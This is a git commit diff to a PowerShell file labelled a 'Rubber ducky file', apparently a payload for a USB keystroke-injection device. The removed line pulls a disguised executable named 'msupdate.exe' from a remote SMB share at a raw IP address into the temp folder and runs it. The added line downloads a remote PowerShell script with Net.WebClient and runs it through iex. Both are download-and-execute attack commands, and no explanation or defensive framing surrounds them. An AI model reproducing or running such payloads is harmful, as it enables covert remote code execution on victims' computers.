3cbe7ef907024f82847c016429130907a7ca21c9
Justin Perdok <justin-p@users.noreply.github.com>
2020-08-11 10:21:17 +0000

    Update d.ps1

--- d.ps1
+++ d.ps1
@@ -1,2 +1,2 @@
 # Rubber ducky file.
-C:\Windows\System32\cmd.exe /c start /min cmd /c "pushd \\5.200.18.86\download & copy msupdate.exe %userprofile%\appdata\local\temp & popd"; powershell.exe -c "start-sleep -s 10;%LOCALAPPDATA%\temp\msupdate.exe"
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/justin-p/PowerShell/master/portal.ps1')
